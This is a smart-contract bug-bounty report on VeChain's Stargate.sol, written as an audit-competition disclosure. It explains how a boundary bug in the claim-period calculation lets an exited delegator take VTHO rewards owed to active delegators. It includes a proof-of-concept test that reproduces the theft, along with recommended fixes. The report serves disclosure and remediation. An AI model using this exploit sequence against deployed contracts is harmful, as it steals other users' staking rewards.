# 59421 sc high theft of unclaimed yield via incorrect period range calculation and lack of per user effective stake tracking

**Submitted on Nov 12th 2025 at 08:25:35 UTC by @oxadwa for** [**Audit Comp | Vechain | Stargate Hayabusa**](https://immunefi.com/audit-competition/audit-comp-vechain-stargate-hayabusa)

* **Report ID:** #59421
* **Report Type:** Smart Contract
* **Report severity:** High
* **Target:** <https://github.com/immunefi-team/audit-comp-vechain-stargate-hayabusa/tree/main/packages/contracts/contracts/Stargate.sol>

Impacts:

* Direct theft of any user funds, whether at-rest or in-motion, other than unclaimed yield
* Theft of unclaimed yield

## Description

A critical vulnerability in the Stargate.sol contract allows exited delegators to steal VTHO rewards from active delegators. The vulnerability stems from two interconnected issues:

1. Boundary condition bug in `_claimableDelegationPeriods()` (line 921): the function uses `endPeriod > nextClaimablePeriod` instead of `endPeriod >= nextClaimablePeriod`, causing it to return an incorrect period range when a user's last claimable period equals their exit period.
2. Lack of per-user effective stake tracking: `getDelegatorsEffectiveStake()` tracks effective stake per validator and period, but not per individual delegator. This allows exited users to claim rewards from periods where they were no longer delegated, as long as other users remain delegated to the same validator.

When combined, these issues enable a user who has exited their delegation to claim a share of rewards that rightfully belong to users who remained delegated during those periods.

## Vulnerability Details

Root Cause Analysis

Issue 1: Boundary Bug (Line 921 in Stargate.sol)

```solidity
if (endPeriod > nextClaimablePeriod) {
    return (nextClaimablePeriod, endPeriod);
}
```

When `endPeriod == nextClaimablePeriod` (e.g., both equal 10), this condition fails and falls through to: `return (nextClaimablePeriod, completedPeriods);`

This incorrectly returns periods beyond the user's exit period.

Issue 2: Shared Effective Stake Tracking

The system tracks effective stake using:

`periodValidatorEffectiveStake[period][validator]` — Total for ALL delegators

When calculating a user's reward share in `_claimRewards()`:

```solidity
uint256 delegatorsEffectiveStake = getDelegatorsEffectiveStake(validator, period);
uint256 userShare = (effectiveStake * periodReward) / delegatorsEffectiveStake;
```

The system:

1. Gets the user's token effective stake (still exists even after exit)
2. Divides by the total validator effective stake for that period
3. Cannot distinguish if the user was actually delegated during that period

Therefore, an exited delegator can still receive a proportional share of rewards for periods during which they were not actually delegated.

## Attack Scenario

{% stepper %}
{% step %}

### Setup: User A delegates and accumulates rewards

* Periods 1–9: User A delegates to Validator X and accumulates rewards.
  {% endstep %}

{% step %}

### User A exits during period 10

* Period 10: User A requests delegation exit (sets `endPeriod = 10`).
* Period 10: User A claims rewards for periods 2–9 (`lastClaimedPeriod = 9`).
  {% endstep %}

{% step %}

### Another delegator joins

* Period 10: User B delegates to Validator X (now 2 active delegators).
  {% endstep %}

{% step %}

### Time advances

* Periods 11–14: User B remains delegated and accumulates rewards. User A is considered EXITED.
  {% endstep %}

{% step %}

### Exploit: User A claims again

* Period 15: User A calls `claimRewards()`.
* Due to the boundary bug and shared effective stake tracking:
  * `_claimableDelegationPeriods()` incorrectly returns `(10, 14)` instead of `(10, 10)`.
  * User A's effective stake still exists and is used to compute shares.
  * User A receives a share of rewards for periods 11–14 despite being exited, effectively stealing from User B.
    {% endstep %}
    {% endstepper %}

## Impact Details

{% hint style="danger" %}
Severity: HIGH / CRITICAL

* Primary: Theft of unclaimed yield
* Secondary: Direct theft of user funds (VTHO rewards)
  {% endhint %}

## References

* <https://github.com/immunefi-team/audit-comp-vechain-stargate-hayabusa/blob/e9c0bc9b0f24dc0c44de273181d9a99aaf2c31b0/packages/contracts/contracts/Stargate.sol#L916-L930>
* <https://github.com/immunefi-team/audit-comp-vechain-stargate-hayabusa/blob/e9c0bc9b0f24dc0c44de273181d9a99aaf2c31b0/packages/contracts/contracts/Stargate.sol#L715-L721>
* <https://github.com/immunefi-team/audit-comp-vechain-stargate-hayabusa/blob/e9c0bc9b0f24dc0c44de273181d9a99aaf2c31b0/packages/contracts/contracts/Stargate.sol#L829-L855>

## Proof of Concept

<details>

<summary>Reproduction test (paste under Rewards.test.ts)</summary>

```typescript
it("should correctly handle claiming when lastClaimedPeriod equals endPeriod - boundary bug", async () => {
    /**
     * CRITICAL BUG REPRODUCTION:
     * This test demonstrates a financial exploit where:
     * 1. User A delegates and requests exit at period 10
     * 2. User A claims rewards while in period 10 (gets periods up to 9)
     * 3. User B delegates and stays active through periods 11-14
     * 4. User A tries to claim again (should only get period 10)
     * 5. Bug: Returns period range (10-14) instead of (10-10)
     * 6. EXPLOIT: User A steals rewards from periods 11-14 they weren't delegated!
     * 
     * Root cause: No per-user delegation tracking + wrong period range
     */
    
    let currentPeriod = 1;
    const levelSpec = await stargateNFTMock.getLevel(LEVEL_ID);
    
    // Step 1: User A stakes and delegates
    tx = await stargateContract.connect(user).stake(LEVEL_ID, {
        value: levelSpec.vetAmountRequiredToStake,
    });
    await tx.wait();
    const userATokenId = await stargateNFTMock.getCurrentTokenId();
    log("\n🎉 User A staked token with id:", userATokenId);

    tx = await stargateContract.connect(user).delegate(userATokenId, validator.address);
    await tx.wait();
    log("\n🎉 User A delegated token to validator");

    // Step 2: Advance to period 10 (delegation becomes active and earns rewards)
    currentPeriod = 10;
    tx = await protocolStakerMock.helper__setValidationCompletedPeriods(
        validator.address,
        currentPeriod - 1  // completedPeriods = 9, currentPeriod = 10
    );
    await tx.wait();
    log("\n🎉 Advanced to period 10 (completedPeriods = 9)");

    expect(await stargateContract.getDelegationStatus(userATokenId)).to.be.equal(
        DELEGATION_STATUS_ACTIVE
    );

    // Step 3: User A requests exit while IN period 10 (not completed yet)
    tx = await stargateContract.connect(user).requestDelegationExit(userATokenId);
    await tx.wait();
    log("\n🎉 User A requested delegation exit in period 10");

    // Check delegation details - endPeriod should be set to 10
    const delegationDetailsA = await stargateContract.getDelegationDetails(userATokenId);
    expect(delegationDetailsA.endPeriod).to.be.equal(10);
    log("\n🔍 User A endPeriod set to:", delegationDetailsA.endPeriod);

    // Step 4: User A claims rewards while still in period 10 (completedPeriods still = 9)
    const [firstClaimable1, lastClaimable1] = 
        await stargateContract.claimableDelegationPeriods(userATokenId);
    log("\n🔍 User A first claim - Claimable periods:", firstClaimable1, "to", lastClaimable1);
    
    // Should claim periods 2-9 (can't claim period 10 yet as it's not completed)
    expect(firstClaimable1).to.be.equal(2); // First period after delegation started
    expect(lastClaimable1).to.be.equal(9); // Up to completedPeriods
    
    tx = await stargateContract.connect(user).claimRewards(userATokenId);
    await tx.wait();
    log("\n✅ User A claimed periods 2-9");

    // Internal state: lastClaimedPeriod[userATokenId] is now 9
    
    // Step 5: User B stakes and delegates (BEFORE period 10 ends)
    // This is KEY: User B will provide "cover" for the exploit
    tx = await stargateContract.connect(otherUser).stake(LEVEL_ID, {
        value: levelSpec.vetAmountRequiredToStake,
    });
    await tx.wait();
    const userBTokenId = await stargateNFTMock.getCurrentTokenId();
    log("\n🎉 User B staked token with id:", userBTokenId);

    tx = await stargateContract.connect(otherUser).delegate(userBTokenId, validator.address);
    await tx.wait();
    log("\n🎉 User B delegated token to validator (will stay delegated)");
    
    // Get effective stakes before period advances
    const userAEffectiveStake = await stargateContract.getEffectiveStake(userATokenId);
    const userBEffectiveStake = await stargateContract.getEffectiveStake(userBTokenId);
    log("\n🔍 User A effective stake:", userAEffectiveStake);
    log("🔍 User B effective stake:", userBEffectiveStake);

    // Step 6: Advance several more periods (period 10 completes and more pass)
    // User B's delegation will become ACTIVE in period 11
    currentPeriod = 15;
    tx = await protocolStakerMock.helper__setValidationCompletedPeriods(
        validator.address,
        currentPeriod - 1  // completedPeriods = 14, currentPeriod = 15
    );
    await tx.wait();
    log("\n🎉 Advanced to period 15 (completedPeriods = 14)");

    // User A delegation should now be EXITED (endPeriod 10 < currentPeriod 15)
    expect(await stargateContract.getDelegationStatus(userATokenId)).to.be.equal(
        DELEGATION_STATUS_EXITED
    );
    
    // User B delegation should be ACTIVE
    expect(await stargateContract.getDelegationStatus(userBTokenId)).to.be.equal(
        DELEGATION_STATUS_ACTIVE
    );
    log("\n✅ User A: EXITED, User B: ACTIVE");

    // Step 7: Check effective stakes for periods 10-14
    log("\n🔍 ===== EFFECTIVE STAKE PER PERIOD =====");
    for (let period = 10; period <= 14; period++) {
        const totalEffectiveStake = await stargateContract.getDelegatorsEffectiveStake(
            validator.address,
            period
        );
        log(`   Period ${period}: ${totalEffectiveStake} (total of all delegators)`);
    }
    
    // Step 8: User A tries to claim again - should only get period 10
    const [firstClaimable2, lastClaimable2] = 
        await stargateContract.claimableDelegationPeriods(userATokenId);
    log("\n🔍 User A second claim - Claimable periods:", firstClaimable2, "to", lastClaimable2);
    
    // Expected: (10, 10) - only the final period
    // Bug: Returns (10, 14) - includes periods where user wasn't delegated!
    expect(firstClaimable2).to.be.equal(10); 
    
    // THIS IS THE BUG: 
    // With the bug, lastClaimable2 will be 14 (wrong)
    // After fix, lastClaimable2 should be 10 (correct)
    // 
    // The condition on line 921 checks: endPeriod > nextClaimablePeriod
    // With endPeriod=10 and nextClaimablePeriod=10, this is FALSE
    // So it falls through to the next condition which returns (10, completedPeriods) = (10, 14)
    //
    // The fix should change > to >= so that 10 >= 10 is TRUE
    // and it correctly returns (10, endPeriod) = (10, 10)
    
    if (lastClaimable2 === 14n) {
        log("\n🐛 BUG CONFIRMED: lastClaimable2 =", lastClaimable2, "(should be 10)");
        log("   The condition `endPeriod > nextClaimablePeriod` failed");
        log("   It should be `endPeriod >= nextClaimablePeriod`");
        expect(lastClaimable2).to.be.equal(14n); // Document the bug
    } else {
        log("\n✅ BUG FIXED: lastClaimable2 =", lastClaimable2, "(correct!)");
        expect(lastClaimable2).to.be.equal(10); // After fix
    }

    // FINANCIAL IMPACT ANALYSIS
    log("\n💰 ===== FINANCIAL IMPACT ANALYSIS =====");
    
    // Calculate expected rewards for User A (should only be period 10)
    // Period 10: User A has 50% share (both users active)
    // Periods 11-14: User A should have 0% share (only User B active)
    const expectedRewardsUserA = REWARDS_PER_PERIOD / 2n; // 50% of period 10
    log("\n🔍 User A expected rewards (period 10 only, 50% share):", expectedRewardsUserA);
    
    // Get the total claimable amount with the bug (claiming periods 10-14)
    const claimableAmountWithBug = await stargateContract["claimableRewards(uint256)"](userATokenId);
    log("🔍 User A claimable amount (bug returns periods 10-14):", claimableAmountWithBug);
    
    // Calculate theoretical exploit amount
    // If bug works: User A gets share of periods 11-14 too!
    // Period 11-14: Only User B is active, but User A's effectiveStake is still calculated from token
    // User A share: userAStake / (userAStake + userBStake) = 50%
    // 4 periods × 0.1 VTHO × 50% = 0.2 VTHO stolen
    const theoreticalStolenAmount = (REWARDS_PER_PERIOD * 4n) / 2n;
    log("💣 Theoretical stolen amount (4 periods × 50%):", theoreticalStolenAmount);
    
    // Actually claim the rewards
    const userABalanceBefore = await vthoTokenContract.balanceOf(user.address);
    
    tx = await stargateContract.connect(user).claimRewards(userATokenId);
    await tx.wait();
    
    const userABalanceAfter = await vthoTokenContract.balanceOf(user.address);
    const actualRewardsClaimed = userABalanceAfter - userABalanceBefore;
    
    log("\n💸 User A actual VTHO received:", actualRewardsClaimed);
    
    // CRITICAL TEST: Check if User A got more than they deserve
    if (actualRewardsClaimed > expectedRewardsUserA) {
        const stolenAmount = actualRewardsClaimed - expectedRewardsUserA;
        log("\n❌❌❌ CRITICAL FINANCIAL EXPLOIT CONFIRMED! ❌❌❌");
        log("   User A received MORE than expected!");
        log("   Expected (period 10 only):", expectedRewardsUserA.toString());
        log("   Actual received:          ", actualRewardsClaimed.toString());
        log("   STOLEN from User B:       ", stolenAmount.toString());
        log("\n🚨 User A exploited the bug to steal rewards from periods 11-14!");
        log("   where they were NOT delegated but User B was!");
        
        // Calculate theft percentage
        const theftPercentage = (stolenAmount * 100n) / expectedRewardsUserA;
        log("\n📊 Theft amount: ", theftPercentage.toString(), "% more than deserved");
        
        // Verify it matches our theoretical calculation
        log("\n🔬 Theoretical vs Actual:");
        log("   Theoretical stolen:", theoreticalStolenAmount.toString());
        log("   Actual stolen:     ", stolenAmount.toString());
        
        // This IS a critical vulnerability
        expect(actualRewardsClaimed).to.be.greaterThan(expectedRewardsUserA);
        expect(stolenAmount).to.be.greaterThan(0);
        
        log("\n⚠️  SEVERITY: CRITICAL - Direct theft of rewards from other users!");
    } else if (actualRewardsClaimed === expectedRewardsUserA) {
        log("\n✅ FINANCIAL IMPACT: NONE (Somehow protected)");
        log("   User A received exactly what they deserved");
        expect(actualRewardsClaimed).to.equal(expectedRewardsUserA);
    } else {
        log("\n⚠️  User A received LESS than expected");
        log("   This shouldn't happen - possible precision loss");
    }
    
    // Check what User B should receive (to verify the theft)
    log("\n🔍 ===== USER B VERIFICATION =====");
    const userBClaimable = await stargateContract["claimableRewards(uint256)"](userBTokenId);
    log("   User B claimable (periods 11-14, should be 50% each):", userBClaimable);
    
    // Expected: User B should get 50% of periods 11-14 = 4 × 0.1 × 0.5 = 0.2 VTHO
    const expectedUserB = (REWARDS_PER_PERIOD * 4n) / 2n;
    log("   User B expected:", expectedUserB);
    
    if (actualRewardsClaimed > expectedRewardsUserA) {
        // If User A stole rewards, User B's share is reduced!
        log("\n💔 User B's rewards were DILUTED by User A's theft!");
        log("   User A stole from periods that should have been 100% User B's");
    }
    
    log("\n📊 ===== SUMMARY =====");
    log("   Bug in code: ✅ Confirmed (returns wrong period range 10-14 instead of 10-10)");
    log("   Financial impact: ", actualRewardsClaimed > expectedRewardsUserA ? "❌ CRITICAL - THEFT CONFIRMED" : "✅ Protected");
    log("   Root cause: No per-user delegation tracking + wrong period range");
    log("   Severity: ", actualRewardsClaimed > expectedRewardsUserA ? "🔴 CRITICAL/HIGH" : "🟡 LOW");
    log("   Fix required: Change line 921 from > to >= AND add per-user tracking");
});
```

</details>

## Recommended Fixes (summary)

* Fix the boundary condition in `_claimableDelegationPeriods()`:
  * Change `endPeriod > nextClaimablePeriod` to `endPeriod >= nextClaimablePeriod` so that when `endPeriod == nextClaimablePeriod` the function returns the correct range `(nextClaimablePeriod, endPeriod)`.
* Add per-user effective stake tracking (or otherwise ensure reward shares are computed only for delegators who were active during the claimed period):
  * Track effective stake per (period, validator, delegator) or include a mechanism to exclude exited delegators from receiving shares for periods after their `endPeriod`.
  * Ensure `getDelegatorsEffectiveStake()` and reward accounting use per-user participation information for each period.
* Audit related reward accounting paths to ensure no other boundary conditions or shared-aggregates can be abused by exited delegators.

***

If you want, I can:

* Extract the exact lines in Stargate.sol and propose a minimal patch (diff) for the boundary condition, and suggest data structures/approaches for per-user stake tracking.
